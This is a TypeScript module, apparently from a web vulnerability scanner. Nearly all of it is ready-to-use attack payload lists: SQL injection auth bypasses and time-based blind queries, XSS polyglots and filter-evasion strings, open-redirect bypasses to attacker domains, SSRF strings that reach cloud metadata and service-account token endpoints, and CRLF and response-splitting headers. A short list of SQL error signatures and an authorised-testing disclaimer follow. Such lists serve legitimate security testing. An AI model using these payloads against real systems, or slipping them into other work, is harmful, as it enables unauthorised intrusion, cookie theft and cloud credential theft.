
import { VulnerabilityType, Payload } from './types';

export const SQLI_PAYLOADS: string[] = [
  // Classic & Auth Bypass
  "' OR '1'='1",
  '" OR "1"="1',
  "admin'--",
  "admin' #",
  "admin'/*",
  "' OR 1=1--",
  "1' OR '1'='1",
  "')) OR (('1'='1",
  
  // Evasion & Encoding
  "0x27204f52202731273d2731", // Hex encoded
  "/**/OR/**/1=1", // Comment obfuscation
  "'%20OR%201=1%20--", // URL encoded
  "1' OR 2>1--", // Logic comparison
  "1' OR 3*2=6--", // Arithmetic logic
  
  // Time-based Blind (MySQL, Postgres, etc.)
  "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
  "1' OR SLEEP(5)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "1' AND (SELECT 8432 FROM (SELECT(SLEEP(5)))PshU)--",
  "1' AND pg_sleep(5)--",
  
  // Boolean-based
  "1' AND 1=1--",
  "1' AND 1=2--",
  
  // Union-based
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT 1,2,3,4,5--",
  "1' UNION SELECT @@version,user(),database()--",
];

export const XSS_PAYLOADS: string[] = [
  // Polyglots (Dangerous/Evasive)
  "jaVasCript:/*-/*`/*\"/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(al\\ert)(1)//'>",
  
  // Script tag variations
  "<script>alert(document.domain)</script>",
  "<script>confirm(1)</script>",
  "'\"><script>alert(1)</script>",
  "<ScRiPt>alert(1)</sCrIpT>", // Case obfuscation
  
  // Event handlers (No script tag)
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)>",
  "<iframe src=\"javascript:alert(1)\">",
  "<math><mtext><option><mglyph><svg><style><path id='\"' /><path id='\" onload='alert(1)' />",
  "<a onmouseover=alert(1)>XSS</a>",
  "<input onfocus=alert(1) autofocus>",
  
  // Context breakers & Template Injection
  "javascript:alert(1)",
  "'-alert(1)-'",
  "\";alert(1)//",
  "{{7*7}}",
  "${alert(1)}",
  "{{constructor.constructor('alert(1)')()}}"
];

export const REDIRECT_PAYLOADS: string[] = [
  // Standard & Bypass
  "https://evil.com",
  "//google.com",
  "/\/\/attacker.com",
  "/%09/malicious-site.net",
  "/%0D/phishing-target.io",
  "https:bing.com",
  "//attacker.com/%2f..",
  "//%09/google.com",
  "/%5cgoogle.com",
  "http:google.com",
  
  // JavaScript & Protocol handlers
  "javascript:alert(document.cookie)",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  
  // Cloud Metadata bypass
  "http://169.254.169.254",
];

export const SSRF_PAYLOADS: string[] = [
  // Localhost variations
  "http://127.0.0.1:80",
  "http://localhost:22",
  "http://127.1",
  "http://0.0.0.0",
  "http://[::]:80/",
  "http://0x7f000001", // Hex encoded IP
  "http://2130706433", // Decimal encoded IP
  "http://0177.0.0.1", // Octal encoded IP
  
  // Cloud Metadata (AWS, GCP, Azure)
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/user-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  "http://169.254.169.254/metadata/v1.json",
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
  "http://instance-data/latest/meta-data/",
  
  // Internal Network
  "http://10.0.0.1",
  "http://192.168.1.1",
  "http://172.16.0.1",
];

export const CRLF_INJECTION_PAYLOADS: string[] = [
  // Standard CRLF
  "%0d%0aSet-Cookie: CRLF_Injection=True",
  "%0d%0aInjected-Header: test",
  "\\r\\nSet-Cookie: c=v",
  
  // Evasive & Encoded
  "%250d%250aSet-Cookie: DoubleEncoded=True", // Double encoded
  "%E5%98%8A%E5%98%8DSet-Cookie: UTF8_CRLF=1", // UTF-8 encoded CRLF
  "%0d%0aLocation: https://evil.com",
  
  // Response Splitting (Advanced)
  "/%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Hacked</html>",
  "/%0d%0aContent-Type: text/html%0d%0aContent-Length: 32%0d%0a%0d%0a<html><body>Injected</body></html>"
];

export const SQL_ERROR_SIGNATURES = [
  "SQL syntax",
  "mysql_fetch_array",
  "ORA-01756",
  "SQLite3::query",
  "PostgreSQL query failed",
  "Microsoft OLE DB Provider for SQL Server",
  "Incorrect syntax near",
  "Dynamic SQL Error",
  "Exception: database",
  "valid MySQL result",
];

export const EDUCATIONAL_DISCLAIMER = `DESCARGO DE RESPONSABILIDAD: Esta herramienta es SOLO para fines educativos y pruebas de seguridad autorizadas. Ejecutar este script contra objetivos sin permiso explícito por escrito es ilegal y poco ético. El desarrollador no asume ninguna responsabilidad por el mal uso.`;
